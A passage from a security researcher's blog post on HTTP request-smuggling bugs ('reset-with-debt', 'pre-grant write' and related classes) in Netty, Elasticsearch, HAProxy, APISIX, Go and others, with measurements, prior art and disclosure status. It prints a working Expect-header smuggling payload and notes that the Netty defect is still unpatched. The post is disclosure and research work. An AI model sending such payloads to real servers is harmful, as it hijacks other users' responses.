+<p>I reported it as <code>CVE-2026-74848</code>, fixed in 3.18.0 and affecting 2.12.0 through
+3.17.0.</p>
+</details>
+<h2 id="4-reset-with-debt">4. Reset-with-debt</h2>
+<p>Parser state cleared on an error path while the connection still holds the
+previous request’s bytes, handing the next parse a buffer that starts mid-body.</p><figure class="dgm"><svg viewBox="0 0 440 216" role="img" aria-label="One receive buffer with a read cursor that reset() left in place, over a parser state that it moved."><polygon points="174,12 186,12 180,24" class="dgm__hd"></polygon><text x="192" y="22" class="dgm__s">reset() leaves the cursor here</text><rect x="8" y="28" width="424" height="40" class="dgm__bx"></rect><text x="94" y="52" class="dgm__s dgm__mid">headers, consumed</text><rect x="180" y="28" width="252" height="40" class="dgm__bxa"></rect><text x="306" y="46" class="dgm__sa dgm__mid">57 declared body bytes</text><text x="306" y="60" class="dgm__sa dgm__mid">a complete request</text><g class="dgm__a dgm__a--off"><line x1="180" y1="68" x2="180" y2="82" class="dgm__dl"></line></g><g class="dgm__a dgm__a--off"><line x1="175" y1="85" x2="185" y2="95" class="dgm__ln"></line><line x1="175" y1="95" x2="185" y2="85" class="dgm__ln"></line></g><text x="192" y="94" class="dgm__s">the ByteBuf is untouched</text><rect x="8" y="114" width="160" height="32" class="dgm__bx"></rect><text x="88" y="134" class="dgm__s dgm__mid">body-reading state</text><text x="198" y="124" class="dgm__s dgm__mid">reset()</text><g class="dgm__a"><line x1="168" y1="130" x2="222" y2="130" class="dgm__ln"></line><polygon points="228,130 221,126.5 221,133.5" class="dgm__hd"></polygon></g><rect x="228" y="114" width="204" height="32" class="dgm__bx"></rect><text x="330" y="134" class="dgm__s dgm__mid">SKIP_INITIAL_LINE_CHARS</text><g class="dgm__a"><line x1="220" y1="146" x2="220" y2="160" class="dgm__ln"></line><polygon points="220,166 216.5,159 223.5,159" class="dgm__hd"></polygon></g><rect x="60" y="166" width="320" height="40" class="dgm__bxa"></rect><text x="220" y="184" class="dgm__sa dgm__mid">the next parse starts at the cursor</text><text x="220" y="198" class="dgm__sa dgm__mid">and reads it as a request line</text></svg><figcaption class="dgm__cap" id="dgm-reset-with-debt">reset() clears the parser state and leaves the buffer cursor where it was, so the next parse begins on the first byte of the declared body.</figcaption></figure>
+<p>Netty’s <code>HttpObjectAggregator</code>, <code>GHSA-wg54-m423-h45r</code>, fires
+<code>HttpExpectationFailedEvent</code> when a request carries an unsupported
+expectation (<code>HttpObjectAggregator.java:164</code>), and
+<code>HttpObjectDecoder.userEventTriggered</code> calls <code>reset()</code> on that event while the
+decoder is in body-reading state (<code>HttpObjectDecoder.java:634-641</code>). The next
+<code>decode</code> runs <code>resetNow()</code>, which clears the message, the content length, the
+chunked flag and both parsers, then sets
+<code>currentState = SKIP_INITIAL_LINE_CHARS</code>. The input <code>ByteBuf</code> is never
+touched.</p>
+<p>The shape is a <code>POST /upload</code> carrying an unsupported <code>Expect</code>, a header that
+asks the server to approve a request before the client sends the body, so an
+unknown value is refused while the body is still unread. Its declared 57 body
+bytes are exactly one complete request:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>POST /upload HTTP/1.1</span></span>
+<span class="line"><span>Expect: bogus-expectation-99</span></span>
+<span class="line"><span>Content-Length: 57</span></span>
+<span class="line"><span>Connection: keep-alive</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>GET /slow-marker?d=0&#x26;m=328966520001 HTTP/1.1</span></span>
+<span class="line"><span>Host: h</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Two status lines come back for the one request line written:</p>
+<figure class="trc" aria-labelledby="trc-netty-two-responses"><figcaption class="trc__cap" id="trc-netty-two-responses"><span class="trc__capg" aria-hidden="true">▌</span>Two responses to one request line, the second keyed to the attacker's target</figcaption><div class="trc__stream"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>HTTP/1.1 417 Expectation Failed</span></span>
+<span class="line"><span>content-length: 0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>HTTP/1.1 200 OK</span></span>
+<span class="line"><span>X-Probe2-Route: SMUGGLED</span></span>
+<span class="line"><span>X-Probe2-Uri: <mark class="trc__by">/slow-marker?d=0&#x26;m=328966520001</mark></span></span></code></pre></div><p class="trc__key"><span class="trc__ki"><b class="trc__by">attacker</b> bytes that originated with the attacker</span></p></figure>
+<p>10 of 10 on 4.2.16.Final and 10 of 10 on 4.1.135.Final, where
+<code>userEventTriggered</code> is byte-identical across the two versions. Remove the
+<code>Expect</code> header and it is 0 of 10.</p>
+<details>
+<summary>The second response reaches a different client. The flag that looks like the fix does not stop it, and Elasticsearch.</summary>
+<p>The same Netty case again, this time behind HAProxy with <code>http-reuse always</code>.
+The second of those two responses is delivered to a different client’s
+connection, not merely to a later request on the same one. One desync queues
+one surplus response, so exactly one later client reads it: against twenty
+sequential victims, one got the attacker’s marker and nineteen got their own.
+Which client is hit is decided by the pool, not by Netty. Across the 60
+attacker and victim pairs in the six <code>http-reuse always</code> cells, all 53 that
+shared a backend socket crossed and none of the 7 whose victim was leased a
+different socket did. With <code>http-reuse never</code> nothing crosses at all, on 21
+transactions over 21 distinct backend sockets in each of two cells.</p>
+<p><strong>Why <code>closeOnExpectationFailed</code> is not the fix.</strong> It is the flag to reach for
+here, and the name invites it. With the flag read back off the live handler as
+<code>true</code>, the client sees 0 of 10 second responses, and the application handler
+still ran for the attacker’s request line 10 of 10 times, printed by the server
+itself. The flag gates the socket close,
+not the reset: the aggregator returns <code>closeOnExpectationFailed &#x26;&#x26; ignoreContentAfterContinueResponse(msg)</code>, evaluated after the event has already
+fired. <code>HttpServerUpgradeHandler</code> cannot be given the flag at all: its only
+<code>super()</code> call is <code>super(maxContentLength)</code>, which delegates to
+<code>this(maxContentLength, false)</code>. A pipeline that handles upgrades through that
+class is fixed at <code>false</code>, so not even the socket close is available to it.</p>
+<p><strong>Elasticsearch <code>CVE-2026-78605</code></strong> reaches the same reset through an independent
+call site, <code>Netty4HttpContentSizeHandler</code>, which decides on the <em>declared</em>
+length. A 637-byte probe with <code>Content-Length: 104857601</code> against the default
+100 MiB limit produced <code>413 → 200 → 200</code> on 9.4.3, 12 of 12, with both trailing
+responses carrying the attacker’s own <code>X-Opaque-Id</code> values. Removing the
+<code>Expect</code> line gives 0 of 12. On 9.4.5 the reset call site is absent from the
+shipped bytecode and the 413 arrives with <code>connection: close</code>: 0 of 12.</p>
+<p>The shipped comment beside that reset says the content “will result in
+<code>HttpRequestDecoder</code> failure”. It does not. It is parsed as a request line.</p>
+</details>
+<h2 id="what-did-not-reproduce">What did not reproduce</h2>
+<p><strong>Eighteen of nineteen backend configurations were clean: 0 residues across
+their 546 trials.</strong> Most implementations get this right, and that belongs on
+the page next to the cases above, because “connection reuse is broken” is not
+the claim. I measured 19 configurations across 14 server products for bytes left
+sitting in the receive buffer after an early response, and all but one either
+drained the declared body or closed the connection.</p>
+<p>The exception is CPython’s <code>http.server</code>, and only at a non-default flag.
+<code>python -m http.server --protocol HTTP/1.1</code> left the body owed in 10 of 25
+trials, meaning bytes were still sitting unread in its receive buffer when the
+next request should have started, 10 of 10 on <code>GET</code> and <code>HEAD</code>, with the
+connection closed on
+<code>POST</code> and on a 404. The shipped HTTP/1.0 default is 0 of 25. CPython’s
+documentation says <code>http.server</code> is not for production use.</p>
+<p>The whole measurement is 571 trials: the 546 above, plus the 25
+HTTP/1.1 trials on CPython, which carry all 10 of the residues.</p>
+<h2 id="prior-art-and-where-these-four-sit">Prior art, and where these four sit</h2>
+<p>The notation this field uses, CL.TE and TE.CL and the derivatives TE.0, 0.CL
+and H2.CL, describes which two parties disagree about where a body ends. The
+first term is the header the front end believes and the second is the one the
+back end believes, with <code>0</code> meaning that end reads no body at all. That
+is a different axis from the one here. In the CONNECT case no parser disagrees
+with another: Apache’s reading of those 88 bytes is correct, and Caddy never
+formed a reading at all.</p>
+<p>The label does stretch this far. OpenWrt’s uhttpd advisory,
+<code>GHSA-c2wg-hcff-hqrm</code>, is titled “pre-auth HTTP request smuggling (CL.0),
+keep-alive connection reused with an unread request body” and calls it a
+textbook CL.0 desync. PortSwigger’s own material reaches the same mechanism
+from the other side: its “Eliciting CL.0 behavior” section notes that some
+servers answer a header-triggered error without consuming the body off the
+socket, and that leaving the connection open afterwards is an alternative CL.0
+vector. So the difference is emphasis rather than kind. CL.0 is written about
+a back end that can be persuaded to ignore <code>Content-Length</code>, and treats the
+unconsumed body as one way to elicit that. These four start from the other
+end: the component that finishes a request and reuses the connection without
+accounting for the bytes it wrote, read or announced.</p>
+<p><strong>Pre-grant write</strong> has one close relative that runs in the opposite
+direction. h2c smuggling needs the transition to <strong>succeed</strong>, so a proxy stops
+inspecting a connection it believes is a tunnel. This needs the grant to be
+absent, which is not the same as the request failing: Cloudflare records the
+Pingora case working even where the backend declines the upgrade with a
+<code>200</code>.
+WebSocket smuggling is on the same side as this family rather than the
+opposite one: in Egorov’s write-up the backend refuses the upgrade with a
+<code>426</code> and there is no WebSocket connection at all. Cloudflare’s Pingora fix
+names the pre-grant case directly. <code>CVE-2026-2833</code> is “HTTP Request Smuggling
+via Premature Upgrade”, and Cloudflare’s own write-up heads that section
+“Premature upgrade without 101 handshake” and credits me by name. I wrote the
+Pingora work up separately in 2026, in
+<a href="/post/breaking-pingora/">Breaking Pingora</a>: three smuggling bugs under two
+CVEs, <code>CVE-2026-2833</code> and <code>CVE-2026-2835</code>, and a cache-poisoning one,
+<code>CVE-2026-2836</code>.</p>
+<p><strong>Unproven-drain reuse</strong> borders pause-based desync, and the boundary is the
+trigger. Pause-based desync starts with a server timing out a request and
+leaving the connection open. Here nothing times out: the component reaches its
+reuse decision normally and answers it from something other than the body
+having been read. <a href="https://portswigger.net/research/browser-powered-desync-attacks">Browser-powered desync</a>
+is PortSwigger’s umbrella term for desync attacks that a browser can trigger.
+It includes all client-side desyncs and some server-side ones; I did not
+establish browser-triggerability for the cases here. An advisory from December
+2020 states this server-side mechanism exactly, <code>CVE-2020-26281</code> in async-h1,
+“request smuggling possible with long unread bodies”, without giving it a
+name.</p>
+<p><strong>Promise-credited framing</strong> has a named relative in the pass-through case,
+H2.CL and H2.TE, where a proxy forwards a client’s <code>Content-Length</code> or
+<code>Transfer-Encoding</code> without verifying it. HAProxy’s case above has no <code>Content-Length</code> at all; the chunked
+framing is HAProxy’s own, computed from a frame-header promise. APISIX’s case
+does forward a client header, a <code>Transfer-Encoding</code>, but nginx has de-chunked
+the body underneath it, so the header no longer describes what is sent.</p>
+<p><strong>Reset-with-debt</strong> overlaps a named class at one trigger. The <code>Expect</code> variant
+is expect-based desync, from PortSwigger’s 2025 work. The triggers measured
+above are a size rejection and an unsupported expectation reaching a decoder
+that is already reading a body, which is the same mechanism arrived at
+differently.</p>
+<p>I looked for a trigger that reaches the same <code>reset()</code> without an <code>Expect</code>
+header, because that would separate the two by measurement rather than by
+reading the call site. There is none in these versions. Across 372 attempts
+carrying no <code>Expect</code> header, over four product and limit combinations against
+Netty 4.2.16.Final, Netty 4.1.135.Final and Elasticsearch 9.4.3, the reset was
+never requested once: every one of them drew a <code>413</code>, and no origin’s own log
+recorded a smuggled request. The <code>Expect</code> controls, driven direct to the origin,
+reached it 150 of 150 on Netty, and on Elasticsearch 12 of 12 with <code>Expect: 100-continue</code> against an
+oversize declared length but 0 of 12 with an unsupported expectation, which it
+answers <code>417</code> and closes in the same statement before the reset can run.</p>
+<p>The bytecode says why, and it is sharper than the status codes suggest. The
+two <code>413</code>s come from different methods. <code>continueResponse</code> fires
+<code>HttpExpectationFailedEvent</code> on both of its failure branches, the <code>417</code> one
+and the <code>413</code> one, and in the shipped jar <code>HttpObjectDecoder.userEventTriggered</code>
+is the only caller of its public <code>reset()</code>, which it reaches only when the
+decoder sits in <code>READ_FIXED_LENGTH_CONTENT</code>, <code>READ_VARIABLE_LENGTH_CONTENT</code> or
+<code>READ_CHUNK_SIZE</code>. <code>handleOversizedMessage</code> answers <code>413</code> and never fires that
+event at all. Its caller in <code>MessageAggregator</code> sets a flag that eats the
+surplus as declared body and starves the next request rather than reparsing
+it. Same status, different door. So the separation from
+expect-based desync is not only a reading of the call site; on these versions
+it is measured.</p>
+<p>One of my own cases is an instance of a known class and I am not renaming it.
+A <code>strtoul</code> radix issue where <code>Content-Length: 0100</code> is decimal to one party
+and octal to another is CL.CL, since both ends read the same header and
+disagree about its value.</p>
+<h2 id="disclosure">Disclosure</h2>
+<p>The client-side CONNECT defect is <code>CVE-2026-56866</code>, credited in <code>GO-2026-6605</code>,
+fixed in Go 1.26.9 and 1.27.2. The server-side one Go declined as a security
+issue and classified as hardening; its change is in go1.27.0 and has not been
+backported, so the 1.26 line has no release that removes it.</p>
+<p>Traefik’s is <code>CVE-2026-71324</code>, fixed in 2.11.53, 3.6.24 and 3.7.9, and Envoy’s
+is <code>CVE-2026-73548</code>. Both advisories are published and credit me. HAProxy’s
+is <code>CVE-2026-90678</code> and Elasticsearch’s is <code>CVE-2026-78605</code>; those two and
+APISIX were fixed through their own venues, APISIX as <code>CVE-2026-74848</code> in
+3.18.0. The Caddy report was dismissed.</p>
+<p>Jetty accepted its HTTP/3 case as a bug and closed the advisory two days after
+I filed it, with no CVE. Two advisories are still in triage and have stopped
+moving, and they are not in the same state underneath.
+<code>GHSA-8xjx-55xw-h6h6</code> on nghttpx has been untouched since 20 May 2026, but the
+defect itself is fixed and shipped, which I confirmed by running the attack
+against the release. <code>GHSA-wg54-m423-h45r</code> on Netty has not been edited since
+the day I filed it on 14 July 2026, and neither the event in
+<code>HttpObjectAggregator</code> nor the reset in <code>HttpObjectDecoder</code> has changed on
+either maintained branch. Both are past the 90 days I gave them. Only the
+Netty defect is still live.</p>
+<p>A further set of findings in these families is under coordinated disclosure. I
+will publish that part when the windows close.</p></div> </main> <footer class="foot" data-astro-cid-chqq3b5l> <!-- the zero-length chunk that ends a body --> <div class="crlf" data-astro-cid-chqq3b5l><b aria-hidden="true" data-astro-cid-chqq3b5l>0 0d0a 0d0a</b><i data-astro-cid-chqq3b5l></i></div> <div class="endr" data-astro-cid-chqq3b5l> <p class="endl" data-astro-cid-chqq3b5l> <a href="/preview/id-wire" data-astro-cid-chqq3b5l>&larr; index</a> <span data-astro-cid-chqq3b5l>Rajat Raghav &mdash; xclow3n</span> <a href="mailto:me@xclow3n.com" data-astro-cid-chqq3b5l>me@xclow3n.com</a> <a href="/rss.xml" data-astro-cid-chqq3b5l>RSS</a> </p> </div> </footer> </div> </body></html>
